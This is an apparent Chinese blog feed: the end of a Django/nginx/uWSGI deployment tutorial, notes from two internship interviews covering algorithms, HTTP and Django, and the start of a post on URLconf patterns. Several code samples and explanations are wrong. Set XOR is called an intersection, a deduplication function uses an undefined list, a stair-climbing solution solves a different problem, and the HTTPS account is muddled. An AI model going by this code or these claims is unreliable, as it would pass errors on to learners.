<p>sudo ln -s ~/path/to/your/mysite/mysite_nginx.conf /etc/nginx/sites-enabled/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">注意：记得检查 /etc/nginx/sites-enabled/ 下的软链接是否成功，因为之前我就遇到了路径出错的问题。</div><div class="line"></div><div class="line">#### 部署静态文件</div><div class="line">在运行 nginx 前，你还需要把 Django 的所有静态文件全部整理到之前的 static 文件夹里，在 /mysite/mysite/settings.py 中添加以下内容 :</div></pre></td></tr></table></figure></p>
<p>STATIC_ROOT = os.path.join(BASE_DIR, “static/“)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">接着运行</div></pre></td></tr></table></figure></p>
<p>python manage.py collectstatic<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">现在你发现 Django 所有的静态文件都被整理到了 /mysite/static/ 文件夹里了。</div><div class="line"></div><div class="line">#### 测试 nginx </div><div class="line">首先重启 ngxin 服务 :</div></pre></td></tr></table></figure></p>
<p>sudo /etc/init.d/nginx restart<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在 /mysite/mysite/media/ 文件夹中添加一个 ```media.png``` 文件。</div><div class="line"></div><div class="line">在浏览器中打开 :```http://127.0.0.1:8000/media/media.png</div></pre></td></tr></table></figure></p>
<p>如果显示出了图片，说明 nginx 服务已经正确运行惹。</p>
<p>注意在从浏览器中请求图片信息时，在 uwsgi 里是没有输出信息的，而请求一个其他的动态网页时，则会输出类似<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[pid: 1952|app: 0|req: 3/3] 127.0.0.1 () &#123;36 vars in 599 bytes&#125; [Wed Mar 18 08:43:27 2015] GET /time/ =&gt; generated 63 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)</div><div class="line">``` </div><div class="line">这样的信息。</div><div class="line"></div><div class="line">也就是缩，当你在浏览器中请求 media.png 时， nginx 会检查这个地址 /media/ ，接着它会在 mysite_nginx.conf 文件中看到这段代码:</div></pre></td></tr></table></figure></p>
<p>location /media  {<br>        alias /home/thehackercat/Dev/mysite/mysite/media;  # your Django project’s media files - amend as required<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">它会直接从这个路径下去寻找图片，找到了就显示粗来，没找着就报 404 错误。</div><div class="line"></div><div class="line">#### nginx and uWSGI and test.py</div><div class="line">现在进入 /mysite/ 文件夹 输入以下命令 ：</div></pre></td></tr></table></figure></p>
<p>uwsgi –socket :8001 –wsgi-file test.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在浏览器中访问 ```http://127.0.0.1:8000 ``` 如果出现 &apos;Hello World!&apos; 则说明以下链接是成功的 :</div></pre></td></tr></table></figure></p>
<p>the web client &lt;-&gt; the web server &lt;-&gt; the socket &lt;-&gt; uWSGI &lt;-&gt; Python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 用 UNIX socket 取代 TCP port</div><div class="line">在 mysite/ 文件夹下创建一个新文件 mysite.sock （空文本文档即可）。</div><div class="line"></div><div class="line">然后对 ```mysite_nginx.conf``` 做以下修改 :</div></pre></td></tr></table></figure></p>
<p>server unix:///path/to/your/mysite/mysite.sock; # for a file socket</p>
<h1 id="server-127-0-0-1-8001-for-a-web-port-socket-we’ll-use-this-first"><a href="#server-127-0-0-1-8001-for-a-web-port-socket-we’ll-use-this-first" class="headerlink" title="server 127.0.0.1:8001; # for a web port socket (we’ll use this first)"></a>server 127.0.0.1:8001; # for a web port socket (we’ll use this first)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">运行 :</div></pre></td></tr></table></figure>
<p>sudo /etc/init.d/nginx restart<br>uwsgi –socket mysite.sock –wsgi-file test.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">打开 ```http://127.0.0.1:8000``` 结果报错了，出现了这个错误</div></pre></td></tr></table></figure></p>
<p>[crit] 4133#0: *1 connect() to unix:/home/thehackercat/Dev/mysite/mysite.sock failed (13: Permission denied) while connecting to upstream, client: 127.0.0.1, server: 127.0.0.1, request: “GET / HTTP/1.1”, upstream: “uwsgi://unix:/home/thehackercat/Dev/mysite/mysite.sock:”, host: “127.0.0.1:8000”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">发现原来是权限的问题，于是在命令中加入这一段 :</div></pre></td></tr></table></figure></p>
<p>uwsgi –socket mysite.sock –wsgi-file test.py –chmod-socket=666<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">然后就成功了！</div><div class="line"></div><div class="line">#### 用 uswgi 和 nginx 跑 Django 应用</div><div class="line">如果上面一切都运行正常，则输入下面命令可以跑 Django 应用 :</div></pre></td></tr></table></figure></p>
<p>uwsgi –socket mysite.sock –module mysite.wsgi –chmod-socket=666<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 配置 uWSGI 便捷开启服务器</div><div class="line">如果每次都按上述命令来跑 Django 应用实在麻烦，所以使用 .ini 文件来简化工作，便捷开启服务器，方法如下 : </div><div class="line"></div><div class="line">在 /mysite/ 文件夹下创建文件 mysite_uwsgi.ini ，并填写修改下面内容 :</div></pre></td></tr></table></figure></p>
<p>mysite_uwsgi.ini file<br>[uwsgi]</p>
<h1 id="Django-related-settings"><a href="#Django-related-settings" class="headerlink" title="Django-related settings"></a>Django-related settings</h1><h1 id="the-base-directory-full-path"><a href="#the-base-directory-full-path" class="headerlink" title="the base directory (full path)"></a>the base directory (full path)</h1><p>chdir = /home/thehackercat/Dev/mysite</p>
<h1 id="Django’s-wsgi-file"><a href="#Django’s-wsgi-file" class="headerlink" title="Django’s wsgi file"></a>Django’s wsgi file</h1><p>module = mysite.wsgi</p>
<h1 id="the-virtualenv-full-path-如果你没有装-virtualenv-就把下面这行用注释掉"><a href="#the-virtualenv-full-path-如果你没有装-virtualenv-就把下面这行用注释掉" class="headerlink" title="the virtualenv (full path) 如果你没有装 virtualenv 就把下面这行用注释掉"></a>the virtualenv (full path) 如果你没有装 virtualenv 就把下面这行用注释掉</h1><p>home = /usr/bin/virtualenv</p>
<h1 id="process-related-settings"><a href="#process-related-settings" class="headerlink" title="process-related settings"></a>process-related settings</h1><h1 id="master"><a href="#master" class="headerlink" title="master"></a>master</h1><p>master = true</p>
<h1 id="maximum-number-of-worker-processes"><a href="#maximum-number-of-worker-processes" class="headerlink" title="maximum number of worker processes"></a>maximum number of worker processes</h1><p>processes = 10</p>
<h1 id="the-socket-use-the-full-path-to-be-safe"><a href="#the-socket-use-the-full-path-to-be-safe" class="headerlink" title="the socket (use the full path to be safe"></a>the socket (use the full path to be safe</h1><p>socket = /home/thehackercat/Dev/mysite/mysite.sock</p>
<h1 id="…-with-appropriate-permissions-may-be-needed"><a href="#…-with-appropriate-permissions-may-be-needed" class="headerlink" title="… with appropriate permissions - may be needed"></a>… with appropriate permissions - may be needed</h1><p>chmod-socket = 666</p>
<h1 id="clear-environment-on-exit"><a href="#clear-environment-on-exit" class="headerlink" title="clear environment on exit"></a>clear environment on exit</h1><p>vacuum = true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">现在，只要运行以下命令，就可以跑 Django 应用了 :</div></pre></td></tr></table></figure></p>
<p>uwsgi –ini mysite_uwsgi.ini<br>```</p>
<p>到这里，如果你在浏览器中访问<code>http://127.0.0.1:8000</code> 可以看到正常的 Django 页面，则说明 uWSGI + nginx + Django 配置成功！</p>
<h4 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h4><ol>
<li><a href="http://www.jianshu.com/p/32dbe2537b78" target="_blank" rel="external">nginx与Django不可不说的秘密</a></li>
<li><a href="http://uwsgi-docs.readthedocs.org/en/latest/tutorials/Django_and_nginx.html" target="_blank" rel="external">Setting up Django and your web server with uWSGI and nginx</a></li>
</ol>
<p>有些同学一定会被网上各种教程的 Django 目录结构搞得头大，其实这个目录是可自定义的，下面是我的目录结构 : </p>
<p><img src="http://thehackercat-hackercat.stor.sinaapp.com/django_test4.png" alt="django_menu"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[绿盟 Web 后端实习面试心得]]></title>
      <url>http://lexuslee.me/2015/12/23/2015-12-23-nsfocus-interview/</url>
      <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>12月23号下午2：00参加了绿盟的 Web 后端开发实习生的面试。考官是个胖哥哥，也是科大的，人很温柔和蔼。先问了一些数据结构与算法的问题，接着问了计算机网络的一些基础问题，最后考察了下 Web 开发的一些知识。总得来说题目不难，但是自己也发挥不好，原来以为有了几次面经，但是在现场还是紧张得不行。 (真是给自己的心理素质跪了 ：P)<br><a id="more"></a></p>
<h2 id="数据结构与算法-图的遍历"><a href="#数据结构与算法-图的遍历" class="headerlink" title="(数据结构与算法)图的遍历"></a>(数据结构与算法)图的遍历</h2><p>我怕出错就写了5个结点的无向图，如下：<br><img src="http://thehackercat-hackercat.stor.sinaapp.com/tulun.jpg" alt="undirected graph"></p>
<p>然后写了广度优先遍历：</p>
<p>1-&gt;2-&gt;3-&gt;4-&gt;5</p>
<p>深度优先遍历：</p>
<p>1-&gt;2-&gt;5-&gt;4-&gt;3</p>
<h2 id="数据结构与算法-写个排序算法求列表中倒数第二大的元素"><a href="#数据结构与算法-写个排序算法求列表中倒数第二大的元素" class="headerlink" title="(数据结构与算法)写个排序算法求列表中倒数第二大的元素"></a>(数据结构与算法)写个排序算法求列表中倒数第二大的元素</h2><p>我用 Python 写了个冒泡排序来处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 冒泡排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubbleSort</span><span class="params">(L)</span>:</span></div><div class="line">    <span class="keyword">for</span> passnum <span class="keyword">in</span> range(len(L)<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(passnum):</div><div class="line">            <span class="keyword">if</span> L[i] &gt; L[i+<span class="number">1</span>]:</div><div class="line">				L[i],L[i+<span class="number">1</span>] = L[i+<span class="number">1</span>],L[i]</div><div class="line">    <span class="keyword">return</span> L[<span class="number">-2</span>]</div></pre></td></tr></table></figure>
<h2 id="数据结构与算法-去重的优化算法"><a href="#数据结构与算法-去重的优化算法" class="headerlink" title="(数据结构与算法)去重的优化算法"></a>(数据结构与算法)去重的优化算法</h2><p>接着不造为什么就谈到了之前在海豚面试的时候对算法时间复杂度进行优化的问题，然后考官问了我一个去除一个列表中重复元素的算法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 去重</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">induplicate</span><span class="params">(L)</span>:</span></div><div class="line">	L1 = []</div><div class="line">	<span class="keyword">return</span> [L2.append(i) <span class="keyword">for</span> i <span class="keyword">in</span> L <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> L2]</div></pre></td></tr></table></figure>
<p>这样通过增加空间复杂度来降低时间复杂度</p>
<h2 id="Http-状态码"><a href="#Http-状态码" class="headerlink" title="Http 状态码"></a>Http 状态码</h2><p>这个我当时说错了</p>
<p>我说的是</p>
<ul>
<li>2 开头的是成功</li>
<li>3 开头的是需要等待</li>
<li>4 开头的通常是请求出错</li>
<li>5 开头的是服务器问题</li>
</ul>
<p>后来回来查了下</p>
<ul>
<li>3 开头的标识重定向</li>
<li>5 开头的表示服务不可用</li>
</ul>
<h2 id="TCP-3次握手连接和4次握手断开连接的过程"><a href="#TCP-3次握手连接和4次握手断开连接的过程" class="headerlink" title="TCP 3次握手连接和4次握手断开连接的过程"></a>TCP 3次握手连接和4次握手断开连接的过程</h2><p>这个不能更经典了。</p>
<p>就不详细列出了，可以参见这个<a href="http://blog.csdn.net/zhuying_linux/article/details/7449403" target="_blank" rel="external">详解</a></p>
<h2 id="设计一个产品参数配置页面布局"><a href="#设计一个产品参数配置页面布局" class="headerlink" title="设计一个产品参数配置页面布局"></a>设计一个产品参数配置页面布局</h2><p>我本来打算多扯一些的，因为最近正好在看的<a href="http://book.douban.com/subject/3323633/" target="_blank" rel="external">《写给大家看的设计书》</a>，但是词穷了，就画了个抽屉菜单的布局,但是感觉还有很多交互设计的地方我欠考虑。</p>
<h2 id="Http-和-Https-的区别"><a href="#Http-和-Https-的区别" class="headerlink" title="Http 和 Https 的区别"></a>Http 和 Https 的区别</h2><p>这个我没答出来，我只知道 Https 是经过一定手段加密使得 Http 传输的数据包中一些明文数据变得”隐晦”，但是具体的实现方法不太清楚。</p>
<p>后来我看了一篇 <a href="http://www.fenesky.com/blog/2014/07/19/how-https-works.html" target="_blank" rel="external">Blog</a>，主要是用 SSL/TLS 来对数据包进行加密。</p>
<p>这样经过 SSL/TLS 协议加密后，当客户端收到服务器的 Https 请求后，会查询本机所支持的加密算法，并通过该算法来解密 Https 请求。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次面试总的来说题目相对简单。</p>
<p>面试官也教了我很多网安方面的知识，比如12306的签名协议和网关安全，虽然我是网络安全方面的小白，但是我觉得 Web 安全很炫酷。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[海豚浏览器 Python 实习面试心得]]></title>
      <url>http://lexuslee.me/2015/12/18/2015-12-18-dolphin-interview/</url>
      <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>12月11号下午4：30参加了海豚浏览器的 Python 后台开发实习生的电面，考官一开始先问了我一些 Python 基础的问题，接着问了些计网的经典面试题，最后考了2道算法题，然后开始扯皮一些之前做过的项目中的问题等，最后总结心得如下：<br><a id="more"></a></p>
<h2 id="Python-的-List-能不能作为字典的-key-传入？"><a href="#Python-的-List-能不能作为字典的-key-传入？" class="headerlink" title="Python 的 List 能不能作为字典的 key 传入？"></a>Python 的 List 能不能作为字典的 key 传入？</h2><p>我回答的是不能，因为字典的 key 值必须是不变的，而 List 的值是可变的。</p>
<p>之后我上网查了下，更标准的说法是，Python Dict 的 key 值是 hashable 的，即</p>
<ul>
<li>这个 key 值在其生命周期内是不变的。</li>
<li>并且可以和其他对象进行比较。</li>
</ul>
<p>以下是官方对于 hashable 给出的解释：<br>&gt;</p>
<blockquote>
<p>An object is hashable if it has a hash value which never changes during its lifetime (it needs a hash() method), and can be compared to other objects (it needs an eq() or cmp() method). Hashable objects which compare equal must have the same hash value.</p>
<p>Hashability makes an object usable as a dictionary key and a set member, because these data structures use the hash value internally.</p>
<p>All of Python’s immutable built-in objects are hashable, while no mutable containers (such as lists or dictionaries) are. Objects which are instances of user-defined classes are hashable by default; they all compare unequal (except with themselves), and their hash value is their id().</p>
</blockquote>
<p>所以得出，Python 中所有不变的内奸对象都是 hashable 的，所有可变的容器(比如，list or dict)都不是 hashable 的，故不能作为字典的 key。</p>
<h2 id="Python-装饰器是什么，有什么看法？"><a href="#Python-装饰器是什么，有什么看法？" class="headerlink" title="Python 装饰器是什么，有什么看法？"></a>Python 装饰器是什么，有什么看法？</h2><p>正好之前我写了一篇深入理解 Python 装饰器的 <a href="http://thehackercat.me/blog/2015/12/07/python-decorator-learning/" target="_blank" rel="external">blog</a></p>
<p>我就向他解释了下，装饰器是在不修改原先代码块的情况下，为其加上一些装饰。</p>
<p>然后我扯了一些装饰器所使用的 Python 语言的几个特性</p>
<ul>
<li>闭包</li>
<li>把函数作为参数传递</li>
<li>装饰器的迭代</li>
</ul>
<h2 id="Python-的-yield-函数的看法？"><a href="#Python-的-yield-函数的看法？" class="headerlink" title="Python 的 yield() 函数的看法？"></a>Python 的 yield() 函数的看法？</h2><p>我想起来之前有看过一篇 <a href="http://pyzh.readthedocs.org/en/latest/the-python-yield-keyword-explained.html" target="_blank" rel="external">blog</a> 正好讲过。</p>
<p>yield 函数是 Python 在进行迭代时，函数内部的代码并不立刻执行，而是返回一个 generator 对象，接着每次迭代时，再读取下一个元素。</p>
<p>这样的好处在于，不需要一次性读取全部对象，二是实时地读取生成数据，减少了内存的开支。</p>
<h2 id="解释下-Django-的-MVC-模式，其中那一部分充当的是-controller-的部分？"><a href="#解释下-Django-的-MVC-模式，其中那一部分充当的是-controller-的部分？" class="headerlink" title="解释下 Django 的 MVC 模式，其中那一部分充当的是 controller 的部分？"></a>解释下 Django 的 MVC 模式，其中那一部分充当的是 controller 的部分？</h2><p>我解释了下，其实 Django 是一个 MTV 模式的框架, MTV 三个部分如下，</p>
<ul>
<li>模型( Model )，数据存取层：处理与数据相关的所有事务，即如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。</li>
<li>模板( Template )，表现层：处理与表现相关的决定，即如何在页面或其他类型文档中进行显示。</li>
<li>视图( View )，业务逻辑层：存取模型及调取恰当模板的相关逻辑。模型与模板之间的桥梁。</li>
</ul>
<p>而其中作为 controller 的部分是 Django 的 URLconf。</p>
<p>它获取用户在地址栏中输入的 URL 并将其路由到 views 模块对应的各个函数，并调用他们。实现了相应的视图函数路由到相应界面的映射功能。</p>
<h2 id="Django-中的缓存用过吗？看法是？"><a href="#Django-中的缓存用过吗？看法是？" class="headerlink" title="Django 中的缓存用过吗？看法是？"></a>Django 中的缓存用过吗？看法是？</h2><p>正好之前在写一个 Django 练手的图书馆项目中试过 Django 的缓存机制，所以就以那个例子介绍了下。</p>
<p>Django 的缓存系统让开发者能够缓存某个视图的输出。这个缓存是无法在浏览器缓存中控制的，因为它并不包含在 http 头部内。</p>
<p>我用的是 Django 缓存系统的 memcached。 memcached 作为一个后台进程运行，并分配一个指定的内存量，它所实现的功能是提供一个添加、检索和删除缓存中任意数据的快速接口，所有的数据是直接存储在内存中的，所以没有用到数据库或者文件系统，减少了额外开销。</p>
<p>但是 memcached 有一个缺点是，它的缓存是完全存在内存中的，一旦服务器崩溃，辣么所有缓存的数据就丢失了。</p>
<p>其他的缓存机制偶没有用过，所以就没有谈。</p>
<h2 id="用户在浏览器中输入一个网址，到-Django-后台捕捉到请求其中的过程？"><a href="#用户在浏览器中输入一个网址，到-Django-后台捕捉到请求其中的过程？" class="headerlink" title="用户在浏览器中输入一个网址，到 Django 后台捕捉到请求其中的过程？"></a>用户在浏览器中输入一个网址，到 Django 后台捕捉到请求其中的过程？</h2><p>这个我当时貌似讲偏题了，我说的是</p>
<p>用户输入一个网址后</p>
<ol>
<li>浏览器先检查缓存，如果有缓存，就从缓存中获得资源文件并加载，如果木有缓存，则执行下一步。</li>
<li>进行 DNS 域名解析，将域名解析成 ip 地址。</li>
<li>与 ip 地址对影的服务器进行 TCP 连接。</li>
<li>接着经历 TCP 3次握手过程。</li>
<li>一旦连接建立后，开始发送 Http 请求。</li>
<li>服务器获得 Http 请求后，将该请求打包成 HttpRequest 对象。</li>
<li>接着检查 Request 中是否需要 Django 中间件的方法，如果没有则执行下一步。</li>
<li>判断 Request 中的各种信息，诸如 user_agent、GET/POST 等，并在 URLconf 中进行匹配路由到对应的 views 视图函数中。</li>
<li>返回一个 Response 对象，并调用相应的 views 视图函数。</li>
<li>最后返回一个 Http 相应，并加载页面。</li>
</ol>
<h2 id="数据结构与算法-获得两个列表的交集"><a href="#数据结构与算法-获得两个列表的交集" class="headerlink" title="(数据结构与算法)获得两个列表的交集"></a>(数据结构与算法)获得两个列表的交集</h2><p>我第一次写的是<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">intset</span><span class="params">(L1,L2)</span>:</span></div><div class="line">	L = []</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> L1:</div><div class="line">		<span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> L2:</div><div class="line">			L.append(i)</div><div class="line">	<span class="keyword">return</span> L</div></pre></td></tr></table></figure></p>
<p>接着考官问我，这个时间复杂度是多少，很明显是O(n^2)，他又问我有没有更好的方法，</p>
<p>于是我写了第二种方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">intset2</span><span class="params">(L1,L2)</span>:</span></div><div class="line">	L = [set(L1)^set(L2)]</div><div class="line">	<span class="keyword">return</span> L</div></pre></td></tr></table></figure></p>
<p>这样先把L1、L2列表中重复的元素删除了，接着再用异或符来取得他们的交集。</p>
<h2 id="数据结构与算法-一个人一次可以爬3级或5级的台阶，请问他爬到第m层时，有n种解法，求解"><a href="#数据结构与算法-一个人一次可以爬3级或5级的台阶，请问他爬到第m层时，有n种解法，求解" class="headerlink" title="(数据结构与算法)一个人一次可以爬3级或5级的台阶，请问他爬到第m层时，有n种解法，求解"></a>(数据结构与算法)一个人一次可以爬3级或5级的台阶，请问他爬到第m层时，有n种解法，求解</h2><p>这个我当时没写出来，我第一眼感觉是递归的题，后来室友告诉我是线性规划的题。之后我在 leetcode 上也看到了相应的解法，真是太蠢了我！</p>
<p>leetcode 解法如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># @param &#123;integer&#125; n</span></div><div class="line">    <span class="comment"># @return &#123;integer&#125;</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="keyword">if</span> n==<span class="number">1</span> <span class="keyword">or</span> n==<span class="number">2</span>:</div><div class="line">            <span class="keyword">return</span> n</div><div class="line">        a=<span class="number">1</span>;b=<span class="number">2</span>;c=<span class="number">3</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>):</div><div class="line">            c=a+b;a=b;b=c</div><div class="line">        <span class="keyword">return</span> c</div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是我这次 Python 实习面试的大部分考题，面试完之后感觉自己基础还是不扎实，对于性能优化的理解还有缺陷，代码写得不够漂亮，算法方面很薄弱。故决定刷一下 Python 文档和 Leetcode。</p>
<p>而且这次面试感觉要黄，因为都一星期了，HR 还是木有给我打电话 T.T </p>
<p>不过，我有了其他的考虑了，心理也安定了许多。</p>
<p>现在，我只想去睡个十除以三的懒觉。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Django 高级 views 和 URLconf 配置]]></title>
      <url>http://lexuslee.me/2015/12/08/2015-12-08-django-learning-4/</url>
      <content type="html"><![CDATA[<p>由于官网教程讲得迷迷糊糊的，所以我提炼了下代码，发现便于理解很多。</p>
<h2 id="URLconf-技巧"><a href="#URLconf-技巧" class="headerlink" title="URLconf 技巧"></a>URLconf 技巧</h2><figure class="highlight python"><figcaption><span>urls.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 在模块开始导入关联的视图函数，直接传递函数对象</span></div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include, url</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"><span class="keyword">from</span> mysite.views <span class="keyword">import</span> hello, current_datetime, hours_ahead</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, include(admin.site.urls)),</div><div class="line">    url(<span class="string">r'^hello/$'</span>, hello),</div><div class="line">    url(<span class="string">r'^time/$'</span>, current_datetime),</div><div class="line">    url(<span class="string">r'^time/plus/(\d&#123;1,2&#125;)/$'</span>, hours_ahead),</div><div class="line">]</div></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight python"><figcaption><span>urls.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 在模块开始导入 views 模块，传递 views.视图函数</span></div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include, url</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"><span class="keyword">from</span> mysite <span class="keyword">import</span> views</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, include(admin.site.urls)),</div><div class="line">    url(<span class="string">r'^hello/$'</span>, views.hello),</div><div class="line">    url(<span class="string">r'^time/$'</span>, views.current_datetime),</div><div class="line">    url(<span class="string">r'^time/plus/(\d&#123;1,2&#125;)/$'</span>, views.hours_ahead),</div><div class="line">]</div></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>urls.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 传入一个包含模块名+函数名的对象</span></div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include, url</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, include(admin.site.urls)),</div><div class="line">    url(<span class="string">r'^hello/$'</span>, <span class="string">'mysite.views.hello'</span>),</div><div class="line">    url(<span class="string">r'^time/$'</span>, <span class="string">'mysite.views.current_datetime'</span>),</div><div class="line">    url(<span class="string">r'^time/plus/(\d&#123;1,2&#125;)/$'</span>, <span class="string">'mysite.views.hours_ahead'</span>),</div><div class="line">]</div></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>urls.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 开启 URLconf 调试模式</span></div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include, url</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"><span class="keyword">from</span> mysite <span class="keyword">import</span> views</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, include(admin.site.urls)),</div><div class="line">    url(<span class="string">r'^hello/$'</span>, views.hello),</div><div class="line">    url(<span class="string">r'^time/$'</span>, views.current_datetime),</div><div class="line">    url(<span class="string">r'^time/plus/(\d&#123;1,2&#125;)/$'</span>, views.hours_ahead),</div><div class="line">]</div><div class="line"></div><div class="line"><span class="keyword">if</span> settings.DEBUG:</div><div class="line">	urlpatterns += url(<span class="string">r'^debuginfo/$'</span>, views.debug),</div><div class="line">	)</div></pre></td></tr></table></figure>
<h2 id="命名组"><a href="#命名组" class="headerlink" title="命名组"></a>命名组</h2><p>我觉得命名组的模式增加了代码冗余度，且语义化也不好。对于我这种懒人完全不需要 ：D <del>(其实就是我懒的借口)</del></p>
<p>而它的目的在于，将变量以<strong>位置参数</strong>的方式传递给视图函数变为以<strong>关键字参数</strong>的方式传递。</p>
